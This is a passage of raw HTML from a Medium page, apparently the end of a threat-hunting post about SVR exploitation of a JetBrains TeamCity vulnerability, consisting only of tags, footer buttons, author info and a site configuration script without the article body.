rel="noopener follow" href="/tag/threat-hunting?source=post_page-----1b40810f8552--------------------------------"><div class="qz fj cx ra gf rb rc bf b bg z bk rd">Threat Hunting</div></a></div><div class="py ab"><a class="qy ay am ao" rel="noopener follow" href="/tag/information-security?source=post_page-----1b40810f8552--------------------------------"><div class="qz fj cx ra gf rb rc bf b bg z bk rd">Information Security</div></a></div><div class="py ab"><a class="qy ay am ao" rel="noopener follow" href="/tag/detection-engineering?source=post_page-----1b40810f8552--------------------------------"><div class="qz fj cx ra gf rb rc bf b bg z bk rd">Detection Engineering</div></a></div></div></div></div><div class="l"></div><footer class="re rf rg rh ri ab q rj rk c"><div class="l ae"><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="ab cp rl"><div class="ab q kr"><div class="rm l"><span class="l rn ro rp e d"><div class="ab q kr ks"><div class="pw-multi-vote-icon fj kt ku kv kw"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F1b40810f8552&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=---footer_actions--1b40810f8552---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kx ao ky kz la lb am lc ld le kw"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lf lg lh li lj lk ll"><p class="bf b dv z du"><span class="lm">--</span></p></div></div></span><span class="l h g f rq rr"><div class="ab q kr ks"><div class="pw-multi-vote-icon fj kt ku kv kw"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F1b40810f8552&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=---footer_actions--1b40810f8552---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kx ao ky kz la lb am lc ld le kw"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lf lg lh li lj lk ll"><p class="bf b dv z du"><span class="lm">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kx ln lo ab q fk lp lq" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lr"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="rs l jf"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F1b40810f8552&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;source=---footer_actions--1b40810f8552---------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lt" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="rs l jf"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al mb an ao ap ex mc md lq me"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="rt ru rv rw rx l"><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="ry bh r rz"></div><div class="ab sa sb sc jh jg"><div class="sd se sf sg sh si sj sk sl sm ab cp"><div class="h k"><a tabindex="0" rel="noopener follow" href="/@simone.kraus?source=post_page---post_author_info--1b40810f8552--------------------------------"><div class="l fj"><img alt="SIMKRA" class="l fd by ip io cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*BIfekvQdxa7JrHyPD8XJVw.png" width="48" height="48" loading="lazy"/><div class="fr by l ip io fs n ay sn"></div></div></a></div><div class="j i d"><a tabindex="0" rel="noopener follow" href="/@simone.kraus?source=post_page---post_author_info--1b40810f8552--------------------------------"><div class="l fj"><img alt="SIMKRA" class="l fd by so sp cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*BIfekvQdxa7JrHyPD8XJVw.png" width="64" height="64" loading="lazy"/><div class="fr by l so sp fs n ay sn"></div></div></a></div><div class="j i d sq jf"><div class="ab"><span><button class="bf b bg z sr qz ss st su sv sw ev ew sx sy sz fa fb fc fd bm fe ff">Follow</button></span></div></div></div><div class="ab co pp"><div class="ta tb tc td te l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/@simone.kraus?source=post_page---post_author_info--1b40810f8552--------------------------------"><h2 class="pw-author-name bf tg th ti tj tk tl tm ng oe of nk oh oi no ok ol bk"><span class="go tf">Written by <!-- -->SIMKRA</span></h2></a><div class="py ab in"><div class="l jf"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar iy" rel="noopener follow" href="/@simone.kraus/followers?source=post_page---post_author_info--1b40810f8552--------------------------------">536 Followers</a></span></div><div class="bf b bg z du ab tn"><span class="iz l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar iy" rel="noopener follow" href="/@simone.kraus/following?source=post_page---post_author_info--1b40810f8552--------------------------------">196 Following</a></div></div><div class="pg l"></div></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z sr qz ss st su sv sw ev ew sx sy sz fa fb fc fd bm fe ff">Follow</button></span></div></div></div></div></div></div><div class="to l"><div class="ry bh r tp tq tr ts tt"></div><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="ab q cp"><h2 class="bf tg tu hv nz tv hy oc tw tx ty tz ua ub uc ud ue bk">No responses yet</h2><div class="ab uf"><div><div class="bm" aria-hidden="false"><a class="ug uh" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--1b40810f8552--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="ui uj uk ul um l"></div></div></div></div><div class="un uo up uq ur l bx"><div class="h k j"><div class="ry bh us ut"></div><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="uu ab kr ji"><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/about?autoplay=1&amp;source=post_page-----1b40810f8552--------------------------------"><p class="bf b dv z du">About</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----1b40810f8552--------------------------------"><p class="bf b dv z du">Careers</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="uv uw l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----1b40810f8552--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="uv l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/business?source=post_page-----1b40810f8552--------------------------------"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20241218-235912-1e3024e5b3"</script><script>window.__GRAPHQL_URI__ = "https://medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-1b40810f8552","user-3d60ce83d2f7"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"DEFAULT","explicit":false},"viewerIsBot":false},"debug":{"requestId":"59c51248-54bc-481c-baf1-35f92567bfb2","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-0dbcb2c46c839420f7de3d8c94919852-ac34527b49920955-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmedium.com\u002F@simone.kraus\u002Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552","host":"medium.com","hostname":"medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20241218-235912-1e3024e5b3","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20241218-235912-1e3024e5b3","commit":"1e3024e5b30a200d8e607e363a93175b656225c2"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e2